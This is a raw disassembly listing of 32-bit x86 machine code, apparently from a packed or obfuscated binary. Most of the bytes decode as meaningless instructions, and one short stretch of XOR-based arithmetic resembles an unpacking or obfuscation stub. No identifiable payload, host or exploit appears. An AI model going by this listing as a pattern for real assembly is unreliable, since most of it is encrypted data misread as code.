  41a526:	rol    BYTE PTR [ebx+ecx*2+0x150ccb88],cl
  41a52d:	dec    ebx
  41a52e:	mov    bl,0x5
  41a530:	arpl   WORD PTR [esi],dx
  41a532:	test   ah,cl
  41a534:	pop    es
  41a535:	push   ds
  41a536:	jnp    0x41a4d0
  41a538:	stos   DWORD PTR es:[edi],eax
  41a539:	test   al,0x8c
  41a53b:	xor    eax,0xb45cc21d
  41a540:	and    edx,DWORD PTR [esi]
  41a542:	jp     0x41a52e
  41a544:	pop    ebx
  41a545:	sbb    dl,BYTE PTR [edi-0x43dd0f94]
  41a54b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a54c:	cwde   
  41a54d:	lea    edx,[ebx+0x53]
  41a550:	call   0xc6bc41ec
  41a555:	nop
  41a556:	mov    dh,0x3
  41a558:	mov    eax,ds:0xcf9de331
  41a55d:	jge    0x41a5ce
  41a55f:	mov    ecx,0x2cd0e337
  41a564:	(bad)  fs:[eax]
  41a567:	mov    cl,0x5a
  41a569:	out    0x9e,al
  41a56b:	fsubp  st(1),st
  41a56d:	addr16 (bad) 
  41a56f:	sbb    al,0xa0
  41a571:	mov    ds:0xbd9d53aa,al
  41a576:	jne    0x41a52b
  41a578:	inc    ecx
  41a579:	call   0xe643dd02
  41a57e:	mov    ds:0xf6ebc2d2,eax
  41a583:	mov    dh,0x4f
  41a585:	popa   
  41a586:	mov    bl,bh
  41a588:	push   edi
  41a589:	push   esp
  41a58a:	dec    ebp
  41a58b:	in     al,0xe6
  41a58d:	icebp  
  41a58e:	jge    0x41a52c
  41a590:	(bad)  
  41a591:	nop
  41a592:	push   0x2b
  41a594:	retf   
  41a595:	popf   
  41a596:	adc    bh,BYTE PTR [edi-0xf]
  41a599:	sbb    al,0x3
  41a59b:	mov    ch,0xa5
  41a59d:	stos   BYTE PTR es:[edi],al
  41a59e:	cs pop ecx
  41a5a0:	iret   
  41a5a1:	mov    dh,0x8
  41a5a3:	fdivr  st,st(3)
  41a5a5:	pop    es
  41a5a6:	and    al,0xc3
  41a5a8:	dec    edx
  41a5a9:	mov    dh,0x13
  41a5ac:	(bad)  
  41a5ae:	nop
  41a5af:	fnstcw WORD PTR [edi+edi*2]
  41a5b2:	mov    bh,0x20
  41a5b4:	cmp    edi,DWORD PTR [esi+ecx*1]
  41a5b7:	mov    edx,0x78210524
  41a5bc:	sahf   
  41a5bd:	inc    ebx
  41a5be:	rol    al,1
  41a5c0:	sub    BYTE PTR [ebx-0x24],0xd8
  41a5c4:	and    edi,esp
  41a5c6:	(bad)  
  41a5c8:	lock pop ss
  41a5ca:	(bad)  
  41a5cb:	in     eax,dx
  41a5cc:	or     BYTE PTR [eax+eax*4-0x20],0xb6
  41a5d1:	or     BYTE PTR [esi+0x6d],bh
  41a5d4:	sbb    BYTE PTR [edx-0x50],ah
  41a5d7:	dec    ebx
  41a5d8:	push   ebp
  41a5d9:	cdq    
  41a5da:	fldl2e 
  41a5dc:	jle    0x41a600
  41a5de:	mov    BYTE PTR [ecx],bh
  41a5e0:	mov    BYTE PTR [edx-0x2b5c7e78],dh
  41a5e6:	mov    edx,0x567fd879
  41a5eb:	mov    bh,0xba
  41a5ed:	push   0xd62a22bb
  41a5f2:	(bad)  [edx+0x76]
  41a5f5:	shl    DWORD PTR [edi+ebx*1+0xe],0xd9
  41a5fa:	inc    edx
  41a5fb:	adc    ch,dl
  41a5fd:	jo     0x41a678
  41a5ff:	push   ebp
  41a600:	jno    0x41a5bf
  41a602:	mov    dh,0x69
  41a604:	jge    0x41a5fd
  41a606:	mov    esp,0x28f21a45
  41a60b:	push   esp
  41a60c:	aad    0xf5
  41a60e:	jbe    0x41a63c
  41a610:	mov    WORD PTR [ebp-0x65],?
  41a613:	fld    DWORD PTR [edi-0x418319d0]
  41a619:	xchg   edx,eax
  41a61a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a61b:	push   edx
  41a61c:	fwait
  41a61d:	push   ecx
  41a61e:	fs push ecx
  41a620:	or     edx,esi
  41a622:	xlat   BYTE PTR ds:[ebx]
  41a623:	pop    edx
  41a624:	icebp  
  41a625:	rcr    BYTE PTR [ebx+0x71],0x86
  41a629:	in     eax,0x19
  41a62b:	sub    BYTE PTR [edi],ch
  41a62d:	fcomp  st(6)
  41a62f:	push   esp
  41a630:	xor    esp,edx
  41a632:	loop   0x41a610
  41a634:	lods   al,BYTE PTR ds:[esi]
  41a635:	out    0xa,al
  41a637:	jo     0x41a65c
  41a639:	push   edx
  41a63a:	lods   eax,DWORD PTR ds:[esi]
  41a63b:	out    dx,al
  41a63c:	ss ss or eax,0x8509d20c
  41a643:	ins    BYTE PTR es:[edi],dx
  41a644:	test   ecx,ebp
  41a646:	jo     0x41a6a5
  41a648:	addr16 sahf 
  41a64a:	call   0xa47a:0x6fb9f65e
  41a651:	jnp    0x41a5f9
  41a653:	sbb    ebx,DWORD PTR [edx]
  41a655:	sbb    al,0x4c
  41a657:	inc    ebx
  41a658:	fimul  DWORD PTR [ebp-0x5c5c8d7c]
  41a65e:	(bad)  
  41a65f:	dec    ecx
  41a660:	xlat   BYTE PTR ds:[ebx]
  41a661:	sbb    al,0x55
  41a663:	mov    eax,DWORD PTR [edx]
  41a665:	cmp    BYTE PTR [ebx+0x7],cl
  41a668:	pusha  
  41a669:	aad    0x7
  41a66b:	(bad)  
  41a66c:	out    0x77,al
  41a66e:	sub    dh,bl
  41a670:	fst    QWORD PTR [esi]
  41a672:	pop    ebx
  41a673:	icebp  
  41a674:	out    dx,al
  41a675:	push   eax
  41a676:	int    0xf1
  41a678:	mov    DWORD PTR [edx+0x4780d865],ecx
  41a67e:	xor    eax,0x3e9fd5f3
  41a683:	dec    DWORD PTR [ecx-0x80]
  41a686:	mov    WORD PTR [ecx+0x1a],cs
  41a689:	mov    eax,ds:0x1a99b582
  41a68e:	and    BYTE PTR [edx-0x771c9f30],ah
  41a694:	push   ebp
  41a695:	mov    gs,esp
  41a697:	test   eax,0x6e90307d
  41a69c:	pop    ds
  41a69d:	xchg   esi,eax
  41a69e:	dec    eax
  41a69f:	push   ebp
  41a6a0:	adc    BYTE PTR [eax+0x45],0xda
  41a6a4:	inc    esi
  41a6a5:	ins    BYTE PTR es:[edi],dx
  41a6a6:	mov    es,WORD PTR [edi-0x55e74c02]
  41a6ac:	adc    al,0x17
  41a6ae:	icebp  
  41a6af:	add    al,0xe2
  41a6b1:	imul   ebp,DWORD PTR [ebx+0x33acd7b2],0x12a661c4
  41a6bb:	sub    eax,0xc8216984
  41a6c0:	and    esi,ecx
  41a6c2:	sbb    al,cl
  41a6c4:	pop    esi
  41a6c5:	jl     0x41a712
  41a6c7:	jno    0x41a6ae
  41a6c9:	cmp    BYTE PTR [ebp-0x6e6d6576],bl
  41a6cf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a6d0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a6d1:	ja     0x41a707
  41a6d3:	adc    cl,BYTE PTR [edx+0x5b]
  41a6d6:	or     DWORD PTR [eax+0x581cda2],ebx
  41a6dc:	pop    eax
  41a6dd:	cs jae 0x41a6c6
  41a6e0:	mov    bh,0x92
  41a6e2:	adc    DWORD PTR [edx+0x19869348],edi
  41a6e8:	sbb    DWORD PTR ds:0x41bb6135,eax
  41a6ee:	sub    ah,BYTE PTR [ecx+0x150faa7c]
  41a6f4:	loopne 0x41a74c
  41a6f6:	dec    esp
  41a6f7:	and    al,0x4d
  41a6f9:	sar    BYTE PTR [ebp-0x5cafef7a],0x88
  41a700:	mov    ds:0x533c46bd,eax
  41a705:	xchg   ebp,eax
  41a706:	add    al,0x62
  41a708:	fwait
  41a709:	call   0x338c:0x72cf2c44
  41a710:	cwde   
  41a711:	out    0xe4,eax
  41a713:	ror    BYTE PTR [edi+ebp*1-0x22],cl
  41a717:	or     BYTE PTR [ebp-0x4f],dl
  41a71a:	(bad)  
  41a71b:	dec    ebp
  41a71c:	in     al,dx
  41a71d:	daa    
  41a71e:	and    eax,0x3913d2b5
  41a723:	dec    ecx
  41a724:	add    BYTE PTR [ebp+edx*1+0x9],bh
  41a728:	enter  0x3c3b,0xb9
  41a72c:	je     0x41a739
  41a72e:	mov    cl,0x5f
  41a730:	(bad)  
  41a731:	jnp    0x41a717
  41a733:	ret    
  41a734:	imul   esi,DWORD PTR [ebx+0x6f2f3dff],0x8d1c2690
  41a73e:	das    
  41a73f:	xor    al,0xf8
  41a741:	fadd   st,st(0)
  41a743:	mov    edx,0x8ec03392
  41a748:	jae    0x41a7c2
  41a74a:	sbb    eax,0xe3a4bc0a
  41a74f:	test   ah,0x1a
  41a752:	idiv   BYTE PTR [ebx]
  41a754:	jp     0x41a6de
  41a756:	loope  0x41a743
  41a758:	xchg   ecx,eax
  41a759:	cld    
  41a75a:	mov    dl,0xe2
  41a75c:	jecxz  0x41a759
  41a75e:	sub    al,0x7b
  41a760:	stos   BYTE PTR es:[edi],al
  41a761:	push   cs
  41a762:	add    DWORD PTR [edi-0x19],edi
  41a765:	enter  0xf258,0x70
  41a769:	dec    esp
  41a76a:	jo     0x41a7ae
  41a76c:	scas   al,BYTE PTR es:[edi]
  41a76d:	fstp   QWORD PTR [ebp-0x66]
  41a770:	stc    
  41a771:	jno    0x41a7d4
  41a773:	aad    0x6c
  41a775:	fwait
  41a776:	call   0xbee2:0xcecd8a34
  41a77d:	dec    eax
  41a77e:	pop    esi
  41a77f:	xchg   edx,eax
  41a780:	and    eax,0x57fb840f
  41a785:	push   esp
  41a786:	popa   
  41a787:	fstp   DWORD PTR [eax-0x28]
  41a78a:	out    0x97,eax
  41a78c:	push   ss
  41a78d:	pusha  
  41a78e:	mov    ds:0xf6c4f343,eax
  41a793:	jge    0x41a808
  41a795:	stc    
  41a796:	fiadd  WORD PTR [ecx+0x43]
  41a799:	push   esp
  41a79a:	xor    eax,0xb81410f2
  41a79f:	adc    al,BYTE PTR [ebx]
  41a7a1:	jae    0x41a754
  41a7a3:	add    al,0x0
  41a7a5:	loope  0x41a7b3
  41a7a7:	inc    edi
  41a7a8:	inc    eax
  41a7a9:	cs or  eax,0xc14545cc
  41a7af:	repz sub al,0x5
  41a7b2:	push   0x254c5331
  41a7b7:	popf   
  41a7b8:	rcl    BYTE PTR [edi-0x74],1
  41a7bb:	repz sbb esp,DWORD PTR [eax+0x69]
  41a7bf:	xchg   esp,eax
  41a7c0:	mov    dl,0x59
  41a7c2:	lahf   
  41a7c3:	mov    edx,DWORD PTR [ebp-0x14]
  41a7c6:	mov    DWORD PTR [ebp+0x8],edx
  41a7c9:	jmp    0x41cb87
  41a7ce:	mov    edx,DWORD PTR [ebp+0x8]
  41a7d1:	mov    ebx,DWORD PTR [ebp-0x8]
  41a7d4:	xor    edx,eax
  41a7d6:	xor    ebx,eax
  41a7d8:	sub    edx,ebx
  41a7da:	sub    edx,esi
  41a7dc:	xor    edx,eax
  41a7de:	mov    DWORD PTR [ebp+0x8],edx
  41a7e1:	mov    edx,DWORD PTR [ebp+0x8]
  41a7e4:	mov    ebx,DWORD PTR [ebp-0x58]
  41a7e7:	add    edx,0x5708c4
  41a7ed:	imul   edx,ebx
  41a7f0:	mov    DWORD PTR [ebp-0x58],edx
  41a7f3:	mov    edx,DWORD PTR [ebp+0x8]
  41a7f6:	mov    ebx,DWORD PTR [ebp-0x54]
  41a7f9:	add    edx,0x64f8da
  41a7ff:	or     edx,ebx
  41a801:	mov    DWORD PTR [ebp-0x54],edx
  41a804:	mov    edx,DWORD PTR [ebp+0x8]
  41a807:	mov    ebx,DWORD PTR [ebp-0x50]
  41a80a:	add    edx,ecx
  41a80c:	xor    edx,ebx
  41a80e:	mov    DWORD PTR [ebp-0x50],edx
  41a811:	mov    edx,DWORD PTR [ebp+0x8]
  41a814:	mov    ebx,DWORD PTR [ebp-0x4c]
  41a817:	add    edx,edi
  41a819:	jmp    0x41cb62
  41a81e:	retf   
  41a81f:	lock xacquire sub DWORD PTR [ebx+0x2b],esi
  41a824:	mov    bl,0x72
  41a826:	cmp    bl,BYTE PTR [ebp+ebx*2-0x1bfa1d2]
  41a82d:	jecxz  0x41a7bf
  41a82f:	adc    edi,DWORD PTR [ebp+0x7c]
  41a832:	inc    eax
  41a833:	pop    edi
  41a834:	jl     0x41a8b2
  41a836:	test   BYTE PTR [ebx],0xa7
  41a839:	mul    BYTE PTR [edi+0x2d]
  41a83c:	pushf  
  41a83d:	push   ebp
  41a83e:	leave  
  41a83f:	mov    DWORD PTR [ecx],edx
  41a841:	or     BYTE PTR [esi-0x336a116d],ch
  41a847:	jne    0x41a81b
  41a849:	xchg   BYTE PTR [ebx-0x57],dh
  41a84c:	jg     0x41a815
  41a84e:	gs (bad) 
  41a852:	adc    BYTE PTR [eax+edx*2+0x43],ch
  41a856:	sub    eax,0xb02be443
  41a85b:	mov    eax,ds:0x734e9dca
  41a860:	dec    esi
  41a861:	js     0x41a802
  41a863:	dec    ecx
  41a864:	out    0x97,al
  41a866:	jge    0x41a8ac
  41a868:	inc    ebx
  41a869:	add    BYTE PTR [edx+edx*8-0xe],dh
  41a86d:	in     al,0x5d
  41a86f:	in     eax,dx
  41a870:	ins    BYTE PTR es:[edi],dx
  41a871:	aad    0x2b
  41a873:	inc    ebx
  41a874:	add    DWORD PTR [ebp-0x2676a796],edx
  41a87a:	dec    eax
  41a87b:	xor    ebp,DWORD PTR [ecx+0xfe9b69a]
  41a881:	repz or edx,DWORD PTR [ecx+0x7f471a96]
  41a888:	cmp    eax,0xfa609df7
  41a88d:	and    al,0x49
  41a88f:	loopne 0x41a8e9
  41a891:	cmp    al,0x14
  41a893:	fs and al,0x9d
  41a896:	sbb    al,0x65
  41a898:	add    BYTE PTR [ecx-0x28eac5b8],bl
  41a89e:	enter  0x3fc8,0xba
  41a8a2:	mov    eax,0x40adadaf
  41a8a7:	lds    edi,FWORD PTR [edi+0x14b1342c]
  41a8ad:	into   
  41a8ae:	aad    0x5e
  41a8b0:	mov    BYTE PTR [esi-0x42],dl
  41a8b3:	and    ebp,DWORD PTR [esi]
  41a8b5:	(bad)  
  41a8b6:	push   eax
  41a8b7:	push   ecx
  41a8b8:	cwde   
  41a8b9:	sub    BYTE PTR [ebx-0x2fcfa7bf],dh
  41a8bf:	mov    cl,0xf8
  41a8c1:	adc    edx,DWORD PTR [edi-0x1514b7e]
  41a8c7:	repz dec edx
  41a8c9:	jmp    0xcb2ce7e0
  41a8ce:	jns    0x41a8e7
  41a8d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a8d1:	es fs pop dx
  41a8d5:	mov    eax,0x2b662d17
  41a8db:	or     edx,esi
  41a8dd:	push   edi
  41a8de:	int    0xee
  41a8e0:	pop    eax
  41a8e1:	push   ebx
  41a8e2:	sub    ebx,DWORD PTR [edi]
  41a8e4:	repnz popf 
  41a8e6:	push   0x50
  41a8e8:	add    ebp,DWORD PTR [ecx]
  41a8ea:	mov    al,0xf6
  41a8ec:	adc    BYTE PTR [eax+0x4227033e],dl
  41a8f2:	neg    DWORD PTR [edi-0x5b]
  41a8f5:	mov    ebx,0x43951310
  41a8fa:	xchg   BYTE PTR ds:0x44a49f49,bl
  41a900:	or     ebp,esi
  41a902:	add    bh,BYTE PTR [edx+0x6c]
  41a905:	sbb    al,0x5f
  41a907:	test   al,0xa
  41a909:	ins    DWORD PTR es:[edi],dx
  41a90a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a90b:	icebp  
  41a90c:	imul   edi,edx
  41a90f:	scas   eax,DWORD PTR es:[edi]
  41a910:	sbb    BYTE PTR [edx],dl
  41a912:	and    DWORD PTR [ebp-0x66213839],ecx
  41a918:	lahf   
  41a919:	push   ss
  41a91a:	add    eax,DWORD PTR [ecx-0x41c59da8]
  41a920:	mov    al,ds:0x83b4901
  41a925:	(bad)  
  41a926:	(bad)  
  41a927:	xchg   ecx,eax
  41a928:	scas   eax,DWORD PTR es:[edi]
  41a929:	imul   ebx,DWORD PTR [edx+0xb846fa6],0x9e6ca08e
  41a933:	mov    edi,0xdabc9bd7
  41a938:	dec    esi
  41a939:	and    DWORD PTR [ebx-0x37dd9802],esi
  41a93f:	mov    dl,0xf9
  41a941:	mov    ds:0x68f29732,eax
  41a946:	or     dh,BYTE PTR [edx-0x16]
  41a949:	mov    cl,0x7f
  41a94b:	sbb    ecx,DWORD PTR [ecx+0x3b]
  41a94e:	outs   dx,DWORD PTR ds:[esi]
  41a94f:	add    DWORD PTR [edi-0x7aa8b81d],edi
  41a955:	dec    edx
  41a956:	push   eax
  41a957:	lea    ecx,[edi]
  41a959:	ds adc al,0xf3
  41a95c:	push   ebp
  41a95d:	out    0xcc,al
  41a95f:	std    
  41a960:	xchg   esi,eax
  41a961:	call   0x73d9:0x934e4bdf
  41a968:	push   0x3711121f
  41a96d:	and    eax,0x2bc03f62
  41a972:	mov    ds:0x8778ee33,al
  41a977:	pop    es
  41a978:	mov    al,al
  41a97a:	stc    
  41a97b:	jne    0x41a9ae
  41a97d:	cmp    al,0xe0
  41a980:	cmp    al,0xd1
  41a982:	mov    eax,ds:0xc14d72f
  41a987:	or     edi,DWORD PTR [esi-0x52]
  41a98a:	or     DWORD PTR [edi+0x33],ebx
  41a98d:	fild   QWORD PTR [edi-0x5]
  41a990:	jno    0x41a913
  41a992:	mov    bl,cl
  41a994:	push   ds
  41a995:	sbb    edx,DWORD PTR [edi+0x31]
  41a998:	cmp    BYTE PTR [edx],al
  41a99a:	int3   
  41a99b:	sbb    eax,0xcdb8d12e
  41a9a0:	mov    eax,0x6c4730c5
  41a9a5:	in     eax,dx
  41a9a6:	mov    WORD PTR [ebx],?
  41a9a8:	scas   al,BYTE PTR es:[edi]
  41a9a9:	rcl    DWORD PTR [eax],1
  41a9ab:	and    eax,0xf6a2e5b1
  41a9b0:	lods   eax,DWORD PTR ds:[esi]
  41a9b1:	jmp    0xf22e:0x61bc2984
  41a9b8:	or     BYTE PTR [ebx+0x22b5d40b],cl
  41a9be:	mov    eax,0xf925252d
  41a9c3:	lahf   
  41a9c4:	mov    BYTE PTR [ecx+0x6b1edcc2],dl
  41a9ca:	jl     0x41a9ba
  41a9cc:	cli    
  41a9cd:	rol    BYTE PTR [ecx-0x718b51f5],0xa7
  41a9d4:	inc    esp
  41a9d5:	in     al,0xc0
  41a9d7:	js     0x41a9d7
  41a9d9:	int3   
  41a9da:	dec    ebp
  41a9db:	jl     0x41a9d3
  41a9dd:	adc    ecx,DWORD PTR [edx]
  41a9df:	mov    WORD PTR [ebx],fs
  41a9e1:	lea    ebp,[esi]
  41a9e3:	data16 hlt 
  41a9e5:	inc    ecx
  41a9e6:	dec    ebx
  41a9e7:	nop
  41a9e8:	aas    
  41a9e9:	ss push 0xb40a8d69
  41a9ef:	sbb    al,0x9d
  41a9f1:	fsub   QWORD PTR [esi+0x43]
  41a9f4:	fdiv   QWORD PTR [edi-0x2b6e97c6]
  41a9fa:	jo     0x41aa5b
  41a9fc:	mov    edx,0xc66cae1d
  41aa01:	xchg   ebx,eax
  41aa02:	dec    ecx
  41aa03:	and    esi,DWORD PTR [ebp-0x2e]
  41aa06:	jl     0x41aa78
  41aa08:	test   DWORD PTR [ebx+0x4c78506b],edx
  41aa0e:	aam    0xd1
  41aa10:	fidivr DWORD PTR [edx]
  41aa12:	xor    eax,0x40a6d1ce
  41aa17:	and    edi,ebx
  41aa19:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa1a:	push   0x91a983a5
  41aa1f:	sbb    eax,0x56cec560
  41aa24:	int    0x8b
  41aa26:	sbb    ebp,DWORD PTR [ebx]
  41aa28:	sub    eax,0xdb42ba41
  41aa2d:	mov    dl,0xef
  41aa2f:	sub    edi,edx
  41aa31:	push   esi
  41aa32:	mov    WORD PTR [edi-0x71],ss
  41aa35:	and    ebp,edx
  41aa37:	iret   
  41aa38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41aa39:	sbb    al,0x16
  41aa3b:	(bad)  
  41aa3d:	cmp    BYTE PTR [eax],bh
  41aa3f:	ins    DWORD PTR es:[edi],dx
  41aa40:	xor    cl,cl
  41aa42:	and    al,0x15
  41aa44:	xchg   ebx,eax
  41aa45:	xor    dl,BYTE PTR [ecx]
  41aa47:	outs   dx,BYTE PTR ds:[esi]
  41aa48:	icebp  
  41aa49:	push   ecx
  41aa4a:	aad    0xb0
  41aa4c:	(bad)  
  41aa4d:	dec    esp
  41aa4e:	popa   
  41aa4f:	sub    DWORD PTR [ebp+0x60],esp
  41aa52:	jmp    0x74683ded
  41aa57:	pop    esp
  41aa58:	pop    ecx
  41aa59:	push   esi
  41aa5a:	dec    ebp
  41aa5b:	sbb    ecx,DWORD PTR [ebx+0x26]
  41aa5e:	aaa    
  41aa5f:	cld    
  41aa60:	jle    0x41aa44
  41aa62:	repnz fnstsw WORD PTR [ecx+0x54]
  41aa66:	sbb    ah,0x7
  41aa69:	mov    eax,0xbd1c007c
  41aa6e:	shl    BYTE PTR ds:0x3287a8fd,0x4
  41aa75:	and    BYTE PTR [ebp-0x6723233f],bh
  41aa7b:	xor    dl,BYTE PTR [ebp-0x3a]
  41aa7e:	mov    bl,0xa8
  41aa80:	mov    WORD PTR [esi+0x5cf097bb],?
  41aa86:	(bad)  
  41aa87:	repz pop edx
  41aa89:	fbstp  TBYTE PTR [edi+0x31]
  41aa8c:	mov    bl,0xd8
  41aa8e:	loop   0x41aa64
  41aa90:	adc    eax,0x8f2b37c9
  41aa95:	loopne 0x41aa9b
  41aa97:	(bad)  
  41aa98:	out    0x88,eax
  41aa9a:	mov    ecx,0xeb984e71
  41aa9f:	mov    ah,0xf2
  41aaa1:	pop    esp
  41aaa2:	inc    ebx
  41aaa3:	les    ebp,FWORD PTR [ebp+0xe835825]
  41aaa9:	jns    0x41aa2b
  41aaab:	jno    0x41aa68
  41aaad:	outs   dx,DWORD PTR ds:[esi]
  41aaae:	xchg   DWORD PTR ds:0xedd94b6d,ebx
  41aab4:	retf   
  41aab5:	or     eax,DWORD PTR [ebp+0x47ed1429]
  41aabb:	cld    
  41aabc:	ficom  WORD PTR [ebp-0x187d85b7]
  41aac2:	sbb    cl,bh
  41aac4:	ja     0x41aac4
  41aac6:	je     0x41aacc
  41aac8:	adc    al,0x46
  41aaca:	ror    BYTE PTR [ecx],1
  41aacc:	mov    bl,0x16
  41aace:	test   eax,0x7e5eba9b
  41aad3:	xor    eax,0x56e7391c
  41aad8:	std    
  41aad9:	xchg   ebx,eax
  41aada:	test   al,0x57
  41aadc:	(bad)  
  41aadd:	xchg   edi,eax
  41aade:	mov    DWORD PTR [edx+ebp*8-0x3a632f54],0xd4888b9b
  41aae9:	stos   DWORD PTR es:[edi],eax
  41aaea:	call   FWORD PTR [edi]
  41aaec:	cmp    bl,BYTE PTR [edx-0x30cd4457]
  41aaf2:	or     eax,0x1cc5aa54
  41aaf7:	sub    eax,0x47938eca
  41aafc:	shl    cl,1
  41aafe:	or     al,0x26
  41ab00:	test   al,0x6b
  41ab02:	mov    ds:0x70848e9c,eax
  41ab07:	call   0x115c31b0
  41ab0c:	in     eax,dx
  41ab0d:	fisub  WORD PTR [edx-0x27623fa]
  41ab13:	popa   
  41ab14:	sbb    BYTE PTR [ebx+0x1bfac09d],cl
  41ab1a:	push   ss
  41ab1b:	push   ebp
  41ab1c:	shl    DWORD PTR [esi+0x50],cl
  41ab1f:	mov    BYTE PTR [esi+0x29b717ad],ch
  41ab25:	xchg   ebx,eax
  41ab26:	outs   dx,DWORD PTR ds:[esi]
  41ab27:	pop    edi
  41ab28:	cdq    
  41ab29:	ret    0x6f6d
  41ab2c:	mov    bl,0x95
  41ab2e:	push   edx
  41ab2f:	adc    eax,0xa2ad88f2
  41ab34:	push   ecx
  41ab35:	inc    eax
  41ab36:	push   cs
  41ab37:	sbb    DWORD PTR [edi+0x647d41b4],esp
  41ab3d:	or     dh,BYTE PTR [ebx+0x54]
  41ab40:	stc    
  41ab41:	(bad)  
  41ab42:	adc    eax,0x6de71b18
  41ab47:	mov    DWORD PTR [eax],ebx
  41ab49:	scas   eax,DWORD PTR es:[edi]
  41ab4a:	mov    al,ah
  41ab4c:	call   0x5f5d5a7a
  41ab51:	or     eax,0x330ffa8a
  41ab56:	and    ebx,DWORD PTR [edx-0x29]
  41ab59:	call   0x44a7:0xbfc4f4fb
  41ab60:	jmp    0x41abcc
  41ab62:	out    dx,al
  41ab63:	xor    DWORD PTR [bp-0x644b],0xffffff83
  41ab69:	add    eax,0x61f6bcf8
  41ab6e:	push   es
  41ab6f:	dec    eax
  41ab70:	pop    esi
  41ab71:	xor    ebp,DWORD PTR [ebx+0x2fee9e67]
  41ab77:	ins    BYTE PTR es:[edi],dx
  41ab78:	adc    ah,BYTE PTR [ecx]
  41ab7a:	cmp    BYTE PTR [eax-0x31],0xf3
  41ab7e:	xchg   esi,eax
  41ab7f:	ficomp WORD PTR [edx+0x367e69e9]
  41ab85:	aaa    
  41ab86:	lods   eax,DWORD PTR ds:[esi]
  41ab87:	fiadd  DWORD PTR [edx+edx*1-0x2f660798]
  41ab8e:	jmp    0xa3e4b3bc
  41ab93:	cmp    edx,DWORD PTR [ecx-0x58]
  41ab96:	or     BYTE PTR [ecx+ebx*4],0x4c
  41ab9a:	push   ecx
  41ab9b:	es popf 
  41ab9d:	mov    al,ds:0x47f9945a
  41aba2:	not    ch
  41aba4:	std    
  41aba5:	adc    DWORD PTR [esi-0x5201ba46],esi
  41abab:	dec    edx
  41abac:	cmp    DWORD PTR [ecx+0x5b],0x5c664c06
  41abb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abb4:	add    BYTE PTR [ecx-0x32d3e588],dl
  41abba:	dec    ecx
  41abbb:	adc    eax,0x84414bdb
  41abc0:	fmul   st,st(7)
  41abc2:	dec    edi
  41abc3:	ror    BYTE PTR [edi-0xf],cl
  41abc6:	(bad)
  41abca:	lahf   
  41abcb:	jae    0x41ac22
  41abcd:	sub    BYTE PTR [edi],dl
  41abcf:	sbb    al,0x4b
  41abd1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abd2:	test   DWORD PTR [ecx+0x4d],ecx
  41abd5:	dec    ecx
  41abd6:	add    al,0x7b
  41abd8:	jae    0x41ab82
  41abda:	fistp  DWORD PTR [esi]
  41abdc:	add    edx,DWORD PTR [ebx]
  41abde:	xchg   ebx,eax
  41abdf:	and    eax,0xa6814e13
  41abe4:	ror    BYTE PTR [eax],0xfc
  41abe7:	call   0xe884:0xdc81e992
  41abee:	xchg   ebx,eax
  41abef:	xor    DWORD PTR [ecx],0x42
  41abf2:	xor    al,0xcf
  41abf4:	ja     0x41ac68
  41abf6:	rcl    ch,1
  41abf8:	aad    0xef
  41abfa:	retf   0x6592
  41abfd:	inc    ebp
  41abfe:	push   ecx
  41abff:	icebp  
  41ac00:	xlat   BYTE PTR ds:[ebx]
  41ac01:	sbb    eax,0x6816f4ec
  41ac06:	and    eax,0xf886f69c
  41ac0b:	mov    ecx,0xa1495574
  41ac10:	rcl    eax,0xfd
  41ac13:	(bad)  [ebx+0x4f796321]
  41ac19:	push   0xffffff83
  41ac1b:	in     eax,0xcf
  41ac1d:	add    BYTE PTR ds:0x100694a8,bl
  41ac23:	xchg   ebp,eax
  41ac24:	enter  0xf5df,0x37
  41ac28:	mov    ch,0xf5
  41ac2a:	into   
  41ac2b:	hlt    
  41ac2c:	and    eax,0xbc935e11
  41ac31:	out    dx,eax
  41ac32:	or     eax,0xcc94b567
  41ac37:	xchg   ah,dl
  41ac39:	and    dh,BYTE PTR [ecx-0x44955635]
  41ac3f:	outs   dx,DWORD PTR ds:[esi]
  41ac40:	ins    DWORD PTR es:[edi],dx
  41ac41:	jg     0x41ac77
  41ac43:	adc    cl,BYTE PTR [ecx-0x2121cbf5]
  41ac49:	sub    eax,0x34335071
  41ac4e:	ret    0x3d73
  41ac51:	xor    al,0x75
  41ac53:	xor    eax,0x3e4794b
  41ac58:	jns    0x41ac3a
  41ac5a:	(bad)  
  41ac5b:	mul    DWORD PTR [edx+0x2b]
  41ac5e:	or     dl,dh
  41ac60:	pop    edx
  41ac61:	xchg   edx,eax
  41ac62:	out    0x54,al
  41ac64:	sub    dh,dh
  41ac66:	out    dx,eax
  41ac67:	jns    0x41acc0
  41ac69:	ds sahf 
  41ac6b:	leave  
  41ac6c:	pop    esp
  41ac6d:	ins    BYTE PTR es:[edi],dx
  41ac6e:	adc    BYTE PTR [eax],bl
  41ac70:	(bad)  
  41ac71:	mov    al,ds:0x5c033199
  41ac76:	mov    bl,0xd2
  41ac78:	mov    dl,0xd9
  41ac7a:	cmp    eax,0xe70732e5
  41ac7f:	push   ebp
  41ac80:	shl    BYTE PTR [edi],0xc5
  41ac83:	inc    ecx
  41ac84:	mov    dh,0x48
  41ac86:	xor    ebp,DWORD PTR [ebp+0x7c]
  41ac89:	ja     0x41ac99
  41ac8b:	bound  ecx,QWORD PTR [ecx+ebp*2-0x20b516e3]
  41ac92:	aas    
  41ac93:	es js  0x41ac88
  41ac96:	pop    es
  41ac97:	adc    ebx,DWORD PTR [eax+0x3507006a]
  41ac9d:	and    BYTE PTR [ecx+ebx*2],0x1b
  41aca1:	pop    ds
  41aca2:	ja     0x41ad0c
  41aca4:	fs adc DWORD PTR ss:[ebp-0x5af42569],edx
  41acac:	pop    eax
  41acad:	or     BYTE PTR [edi-0x38],cl
  41acb0:	adc    dl,cl
  41acb2:	mov    eax,0xbd404e95
  41acb7:	mov    ebx,0xbb2383bf
  41acbc:	mov    al,0xf5
  41acbe:	mov    ebx,0x1b541327
  41acc3:	pushf  
  41acc4:	jbe    0x41ac82
  41acc6:	mov    esp,0x9d90e91d
